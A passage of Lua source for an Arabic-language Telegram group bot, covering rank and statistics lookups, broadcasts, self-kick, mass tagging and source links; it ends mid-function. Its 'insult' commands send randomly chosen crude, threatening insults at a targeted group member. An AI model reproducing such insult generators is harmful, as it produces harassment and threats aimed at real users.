if text:match("^رتبتي$") and Abbas_Abs(msg) then
function get_rtba(extra,result,success)
if tonumber(result.id_) == tonumber(717869155) then
t = 'مطور السورس'
elseif tonumber(result.id_) == tonumber(bot_owner) then
t = 'المطور الاساسي '
elseif is_sudoid(result.id_) then
t = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(result.id_) then
t = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'منشئ اساسي'
elseif is_monshid(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧنشئ'
elseif is_ownerall(result.id_) then
t = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(result.id_) then
t = 'ٱلٱدمن ٱڵعٱم'
elseif is_vipall(result.id_) then
t = 'ٱڵمميز ٱڵعٱم'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي مرتب 😹💔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧدير'
elseif is_admin(result.id_, msg.chat_id_) then
t = 'ٱلٱدمـۧن'
elseif result.id_ == bot_id then
t = 'هذٱ ٱنٱ ٱڵبۄت'
else
t = 'فقط عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ رتـبتک ⌯» '..t, 1, 'html')
end
getUser(msg.sender_user_id_,get_rtba)
end
--     Source loolIQ     --
if text:match("^معلوماتي$") and Abbas_Abs(msg) then
function get_me(extra,result,success)
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local ABS_PROX = DevAbs:get(loolIQ..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local msguser = tonumber(DevAbs:get(loolIQ..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAbs:get(loolIQ..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAbs:get(loolIQ..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAbs:get(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local text = (tonumber(DevAbs:get(loolIQ.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local sticker = (tonumber(DevAbs:get(loolIQ.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Photo = (tonumber(DevAbs:get(loolIQ.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Voice = (tonumber(DevAbs:get(loolIQ.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Gif = (tonumber(DevAbs:get(loolIQ.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Video = (tonumber(DevAbs:get(loolIQ.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
if tonumber(result.id_) == tonumber(717869155) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer'
else
t = 'مطور السورس'
end
elseif is_leaderid(result.id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = 'المطور الاساسي '
end
elseif is_sudoid(result.id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'sudo 2'
else
t = 'ٱڵمطۄر ٱڵثٱنوي'
end
elseif is_sudo3(result.id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'ٱڵمطۄر ٱلثٱڵث'
end
elseif is_ownerall(result.id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'ٱڵمدير ٱڵعٱم'
end
elseif is_adminall(result.id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ٱلٱدمن ٱڵعٱم'
end
elseif is_vipall(result.id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'ٱڵمميز ٱڵعٱم'
end
elseif is_monsh(result.id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'creator'
else
t = 'ٱڵمنشئ ٱلٱسٱسي'
end
elseif is_monshid(result.id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵـۧمـۧنشئ'
end
elseif is_owner(result.id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'ٱڵـۧمـۧدير'
end
elseif is_admin(result.id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ٱلٱدمـۧن'
end
elseif is_donky(result.id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي مرتب 😹💔'
end
elseif is_vipmem(result.id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
function formsgg(msgs) 
local ABS_PROX = ''  
if msgs < 100 then 
ABS_PROX = 'جدٱ ضعيف' 
elseif msgs < 250 then 
ABS_PROX = 'ضعيف' 
elseif msgs < 500 then 
ABS_PROX = 'غير متفٱعڵ' 
elseif msgs < 750 then 
ABS_PROX = 'متوسط' 
elseif msgs < 1000 then 
ABS_PROX = 'متفٱعڵ' 
elseif msgs < 2000 then 
ABS_PROX = 'قمة ٱڵتفٱعڵ' 
elseif msgs < 3000 then 
ABS_PROX = 'مڵك ٱڵتفٱعڵ'  
elseif msgs < 4000 then 
ABS_PROX = 'ٱسطورة ٱڵتفٱعڵ' 
elseif msgs < 5000 then 
ABS_PROX = 'متفٱعڵ نٱر' 
elseif msgs < 5500 then 
ABS_PROX = 'يجدح جدح' 
elseif msgs < 6000 then 
ABS_PROX = 'خيٱڵي' 
elseif msgs < 7000 then 
ABS_PROX = 'رب ٱڵتفٱعل' 
elseif msgs < 8000 then 
ABS_PROX = 'كٱفر بٱڵتفٱعڵ' 
end 
return ABS_PROX
end
if result.username_ then
username = '@'..result.username_
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
username = 'Not Found'
else
username = 'لا يوجد'
end
end
if result.last_name_ then
lastname = result.last_name_
else
lastname = ''
end
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, ''..t, 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🖍 ⌯ ٱسمک ⇜ { '..result.first_name_..' }\n❗️🚸 ⌯ معرفک ⇜ { '..username..' }\n❗️🧬 ⌯ ٱيـډيک ⇜ { '..result.id_..' }\n❗️🏮 ⌯ نقاطک ⇜ { '..user_nkt..' }\n❗️🔎 ⌯ رسٱئڵک ⇜ { '..(user_msgs + Dev_Abss)..' / '..(ABS_PROX)..'} \n❗️🧩 ⌯ مڵصقٱتک ⇜ { '..sticker..' }\n❗️🎨 ⌯ ٱڵمتحركة ⇜ { '..Gif..' }\n❗️🗽 ⌯ صورک ⇜ { '..Photo..' }\n❗️🔊 ⌯ بصمٱتک ⇜ { '..Voice..' }\n❗️🎬 ⌯ فيديوهٱتک ⇜ { '..Video..' }\n❗️🦠 ⌯ جـهٱتک ⇜ { '..cont..' }\n❗️🔮 ⌯ تفٱعڵک ⇜ { '..formsgg(msguser)..' } \n❗️💎 ⌯ رتـبتک ⇜ '..t, 1, 'html')
end 
end
getUser(msg.sender_user_id_,get_me)
end
if text:match("^الرتبه$") or text:match("^رتبته$") and msg.reply_to_message_id_ ~= 0 then
function rt_by_reply(extra, result, success) 
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
renk_gps = 'ٱڵـۧمـۧنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
renk_gps = 'ٱلٱدمـۧن'
elseif da.status_.ID == "ChatMemberStatusMember" then
renk_gps = 'عضو'
end
if result.id_ then
if tonumber(result.sender_user_id_) == tonumber(SUDO) then
DeveAbs = "المطور الاساسي "
elseif is_sudoid(result.sender_user_id_) then
DeveAbs = "ٱڵمطۄر ٱڵثٱنوي"
elseif is_sudo3(result.sender_user_id_, msg.chat_id_) then
DeveAbs = "ٱڵمطۄر ٱلثٱڵث"
elseif is_ownerall(result.sender_user_id_) then
DeveAbs = "ٱڵمدير ٱڵعٱم"
elseif is_adminall(result.sender_user_id_) then
DeveAbs = "ٱلٱدمن ٱڵعٱم"
elseif is_vipall(result.sender_user_id_) then
DeveAbs = "ٱڵمميز ٱڵعٱم"
elseif is_monsh(result.sender_user_id_, msg.chat_id_) then
DeveAbs = "ٱڵمنشئ ٱلٱسٱسي"
elseif is_monshid(result.sender_user_id_, msg.chat_id_) then
DeveAbs = "ٱڵـۧمـۧنشئ"
elseif is_owner(result.sender_user_id_, msg.chat_id_) then
DeveAbs = "ٱڵـۧمـۧدير"
elseif is_admin(result.sender_user_id_, msg.chat_id_) then
DeveAbs = "ٱلٱدمـۧن"
elseif is_vipmem(result.sender_user_id_, msg.chat_id_) then
DeveAbs = "عضو مميز"
elseif is_donky(result.sender_user_id_, msg.chat_id_) then
DeveAbs = "مطي مرتب 😹💔"
else
DeveAbs = "فقط عضو"
end
end
local ABS_PROX = '❗️🚸 ⌯ رتبة ٱڵمستخدم ⌯» ◝ ['..absc9..'] ◟ \n❗️🔑 ⌯ في ٱڵـبوت ⌯» ◝ '..DeveAbs..' ◟ \n❗️🎗 ⌯ في ٱڵمجموعة ⌯» ◝ '..renk_gps..' ◟ \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
end,nil)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
end
--     Source loolIQ     --
if is_sudo(msg) then
if text == 'توجيه للكل' or text == 'نشر بالتوجيه' or text == 'الاذاعه بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function ABS_PROX(extra,result,success)
local list = DevAbs:smembers(loolIQ.."bot:groups")
for k,v in pairs(list) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
end
local gps = DevAbs:scard(loolIQ..'bot:groups') or 0
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم ٱذٱعة رسٱڵتك بٱڵتوجية \n❗️🔑 ⌯ في : { '..gps..' } مجموعة \n‏ ', 1, 'md')
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ABS_PROX)
end
if text:match("^اذاعه (.*)$") and is_sudo(msg) then  
local gps = DevAbs:scard(loolIQ.."bot:groups") or 0
local gpss = DevAbs:smembers(loolIQ.."bot:groups") or 0
local rwss = {string.match(text, "^(اذاعه) (.*)$")}
local bib = rwss[2]
for i=1, #gpss do
Dev_Abs(gpss[i], 0, 1, bib, 1, 'md')
end
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Your Message send to :{ '..gps..' } groups ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم ٱذٱعة رسٱڵتك \n❗️🔑 ⌯ في : { '..gps..' } مجموعة \n‏ ', 1, 'md')
end
end
end
if text:match("^(time)$") or text:match("^(الوقت)$") or text:match("^(التاريخ)$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️⏰ ⌯ ٱڵوقت : '..os.date("%I:%M%p")..' \n❗️📆 ⌯ ٱڵتٱريخ :  '..os.date("%Y/%m/%d")..' \n ', 1, 'md')
end
if text:match("^زخرفه$") or text:match("^الزخرفه$")  then  
DevAbs:setex(loolIQ.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
DevAbs:setex(loolIQ.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱرسل ڵي ٱڵكلمة ڵزخرفتهٱ \nيمكنك ٱڵزخرفة بٱڵلغة { en } ⌯ { ar } ', 1, 'md')
end
--     Source loolIQ     --
if text:match("^مشاهده المنشور$") or text:match("^مشاهدات المنشور$") or text:match("^عدد المشاهدات$") then
DevAbs:set(loolIQ..'bot:viewget'..msg.sender_user_id_,true)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '> Plese forward your post : ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ حسنٱ قم بٱعٱدة توجية ڵڵمنشور ٱڵذي تريدني حسٱب مشٱهدٱتة', 1, 'md')
end
end
--     Source loolIQ     --
if text:match("^اطردني$") or text:match("^ادفرني$") then
if not DevAbs:get(loolIQ.."lock_kickme"..msg.chat_id_) then
DevAbs:set(loolIQ..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:set(loolIQ..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ هڵ ٱنت متأكد من ٱڵمغٱدرة \n❗️☑️ ⌯ ٱرسل *{ نعم }* ڵيتم ٱلٱمـر \n❗️🔘 ⌯ ٱرسل *{ لا }* لٱڵغٱء ٱلٱمـر ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ عذرٱ هذه ٱڵخٱصية معطڵة ', 1, 'md')
end
end
local kickme = DevAbs:get(loolIQ..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
if text:match("^نعم$") then
if is_vipmem(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ لٱ ٱستطيع طرد ٱڵمشرفين ", 1, "md")
else
local kickme = DevAbs:get(loolIQ..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
DevAbs:del(loolIQ..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:del(loolIQ..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم طردك هيج هيج مٱبيك فٱيدة ", 1, "md")
end
end
end
if text:match("^لا$") then
local notkickme = DevAbs:get(loolIQ..'no'..msg.sender_user_id_..'')
if notkickme == 'kickno' then
DevAbs:del(loolIQ..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:del(loolIQ..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم ٱڵغٱء ٱلٱمـر ڵن ٱطردك ", 1, "md")
end
end
end   
--     Source loolIQ     --
if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(loolIQ.."lock_kickme"..msg.chat_id_) then
DevAbs:set(loolIQ.."lock_kickme"..msg.chat_id_, true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ ٱمـر ٱطردني \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
end
if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ.."lock_kickme"..msg.chat_id_) then
DevAbs:del(loolIQ.."lock_kickme"..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱمـر ٱطردني \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text == "تاك للكل" or text == "صيحهم" then
function tall(f1, f2)
local text = "❗️🚸 ⌯ وينكم يٱڵربع \n〰️➖〰️➖〰️➖〰️➖〰️\n"
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
local user_info = DevAbs:hgetall('user:'..v.user_id_)  
if user_info and user_info.username then
local username = user_info.username
text = text.."<b> "..i.." ⌯ </b> { @"..username.." }\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
--     Source loolIQ     --
if text:match("^كلهم (.*)$")  then
local txt = {string.match(text, "^(كلهم) (.*)$")}
function tall(f1, f2)
local text = "❗️🚸 ⌯ "..txt[2].." \n〰️➖〰️➖〰️➖〰️➖〰️\n"
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
local user_info = DevAbs:hgetall('user:'..v.user_id_)  
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>"..i.." ⌯ </b> { @"..username.." }\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
end
--     Source loolIQ     --
if text:match("^source$") or text:match("^Source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") or text:match("^ياسورس$") then 
local text =  [[
❗️🎗 ⌯ ◟ [Source loolIQ](https://t.me/loolIQ) ◝
❗️🎗 ⌯ ◝ [سورس ديف بروكس](https://t.me/loolIQ) ◟
〰️➖〰️➖〰️➖〰️➖〰️
❗️📣 ⌯ ◟ [Source Channel](https://t.me/loolIQ) ◝
❗️📣 ⌯ ◝ [قناة السورس](https://t.me/loolIQ) ◟
〰️➖〰️➖〰️➖〰️➖〰️
❗️🚸 ⌯ ◟ [Source developer](http://t.me/IQ_ABS) ◝
❗️🚸 ⌯ ◝ [مطور السورس](http://t.me/IQ_ABS) ◟
〰️➖〰️➖〰️➖〰️➖〰️
❗️📯 ⌯ ◟ [Blocked connection](http://t.me/IQA_bot) ◝
❗️📯 ⌯ ◝ [تواصل المحظورين](http://t.me/IQA_bot) ◟
〰️➖〰️➖〰️➖〰️➖〰️
❗️🔅 ⌯ ◟ [Explanation Source](https://t.me/Exp_Dev) ◝
❗️🔅 ⌯ ◝ [شروحات السورس](https://t.me/Exp_Dev) ◟
〰️➖〰️➖〰️➖〰️➖〰️
❗️🔑 ⌯ ◟ [Click here to install](https://t.me/loolIQ/573) ◝
❗️🔑 ⌯ [اضغط هنا لتنصيب السورس](https://t.me/loolIQ/573) ◟
〰️➖〰️➖〰️➖〰️➖〰️
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source loolIQ     --
if text:match("^[Gg][Rr][Oo][Uu][Pp][Ss]$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) or text:match("^الكروبات$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) then
local ABS_PROX = DevAbs:scard(loolIQ.."bot:groups")
local abbs = DevAbs:scard("ABS_PROX:addg"..bot_id) or 0
local users = DevAbs:scard(loolIQ.."bot:userss")
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ *Groups :*  '..gps..'', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱعضٱء ٱڵخٱص ⌯» *('..users..')*\n❗️📮 ⌯ عدد ٱڵكروبٱت ⌯» *('..ABS_PROX..')*\n❗️🔑 ⌯ ٱڵكروبٱت ٱڵمفعڵة ⌯» *('..abbs..')*\n❗️🎗 ⌯ ٱڵغير مفعڵة ⌯» *('..(ABS_PROX - abbs)..')* \n ', 1, 'md')
end
end  
if  text:match("^[Mm]sg$") or text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  then
local user_msgs = DevAbs:get(loolIQ..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local ABS_PROX = DevAbs:get(loolIQ..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ welcome my dear \n❗️🚸 ⌯ you have {*"..(user_msgs + Dev_Abss).." }* msg \n❗️🎗 ⌯ in group ", 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🎒 ⌯ قٱئمة رسٱئڵك في ٱڵمجموعة : \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ رسٱئڵك ٱڵحقيقية ⌯» *("..user_msgs..")* \n❗️🔑 ⌯ رسٱئڵك ٱڵمضٱفة ⌯» *("..Dev_Abss..")* \n❗️🎗 ⌯ رسٱئڵك ٱڵيوم ⌯» *("..(ABS_PROX)..")*\n❗️🔅 ⌯ مجموع رسٱئڵك ⌯» *("..(user_msgs + Dev_Abss)..")* \n ", 1, 'md')
end
end
if text:match("^[Gg]p id$") or text:match("^ايدي المجموعه$") then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
texts = "❗️🚸 ⌯ Group ID ⌯» "..msg.chat_id_
else
texts = "❗️🚸 ⌯ ٱيـۧډي ٱڵمجموعة ⌯» "..msg.chat_id_
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
--     Source loolIQ     --
if text:match("^ايديي$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ ٱيـۧډيک ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md') 
end
--     Source loolIQ     --
if text:match("^[Mm]y username$") or text:match("^معرفي$")  then
function get_username(extra,result,success)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️🚸 ⌯ Your Username ⌯» ( User )'
else
text = '❗️🚸 ⌯ مۘعرفک ⌯» (User)'
end
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
--     Source loolIQ     --
if text:match("^[Mm]y name$") or text:match("^اسمي$") then
function get_firstname(extra,result,success)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️🚸 ⌯ your name ⌯» (firstname)'
else
text = '❗️🚸 ⌯ ٱسـمـك ⌯» (firstname)'
end
local text = text:gsub('firstname',(result.first_name_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source loolIQ     --
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then
 
local text =  [[
❗️🚸 ⌯ [ اضغط هنا لحذف الحساب ](https://telegram.org/deactivate) 
❗️🔑 ⌯ [ اضغط هنا لديك مفاجئه ](https://t.me/loolIQ)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if text:match("^جهاتي$") or text:match("^اضافاتي$") then
add = (tonumber(DevAbs:get(loolIQ..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ عدد جهٱتك ٱڵمضٱفة ⌯» *◝ "..add.." ◟* ", 1, 'md')
end
if text:match("^رسائلي اليوم$") then 
local ABS_PROX = DevAbs:get(loolIQ..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ رسٱئڵك ٱڵيوم ⌯» *◝ "..(ABS_PROX).." ◟* ", 1, 'md')
end
--     Source loolIQ     --
if (msg.sender_user_id_) then
local text = msg.content_.text_:gsub("[Pp]rice", "Nerkh")
if text:match("^[Nn]erkh$") or text:match("^المطور$") then
local nerkh = DevAbs:get(loolIQ.."nerkh")
if nerkh then
Dev_Abs(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
elseif DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ sudo Bot not found ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ڵم يتم تعيين كڵيشة ٱڵمطور \n❗️🔑 ⌯ ٱرسل ( ضع كليشه المطور ) ڵڵحفظ ", 1, "md")
end
end 
end 
--     Source loolIQ     --
if text and text:match('^هينه @(.*)')  then 
local username = text:match('^هينه @(.*)') 
function ABS_PROX(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(bot_owner) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(717869155) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱڵـعضو غير موجود في ٱڵـمجموعة', 1, 'md') 
end 
end 
resolve_username(username,ABS_PROX)
end
--     Source loolIQ     --
if text:match("^هينه$") or text:match("^بعد هينه$") or text:match("^هينه بعد$") or text:match("^لك هينه$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(717869155) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
function bosha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗 '..SUDOUSERNAME..'', 1, 'md')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"مواححح افيـش عافيههه😍🔥💗","امممووااهحح شهلعسـل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
